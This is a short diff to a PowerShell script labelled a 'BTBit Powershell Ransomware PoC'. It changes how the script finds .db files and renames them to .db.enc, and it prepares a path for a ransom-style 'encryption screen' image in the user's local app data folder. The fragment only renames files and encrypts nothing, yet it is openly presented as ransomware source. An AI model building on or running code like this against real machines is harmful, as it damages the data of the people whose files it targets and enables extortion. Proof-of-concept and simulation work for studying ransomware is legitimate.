@@ -1,10 +1,10 @@
 # BTBit Powershell Ransomware PoC 
 # file to rename
-$filter = "*.db"
+$filter = ".db"
 #$drive = (get-location).Drive.Name
-$file_count = (gci -Path $path -File | where fullname -like "*.db").Count
+$file_count = (gci -Path $path -File | where fullname -like "*$filter").Count
 if (-not($file_count -eq "0")) { exit }
-get-childitem -path $path -filter $filter | rename-item -newname {$_.name -replace ".db",".db.enc"}
+get-childitem -path $path -filter "*$filter" | rename-item -newname {$_.name -replace "$filter","$filter.enc"}
 #
 # show encryption screen
 $screen = $ENV:LOCALAPPDATA + "\screen_enc.jpg"  
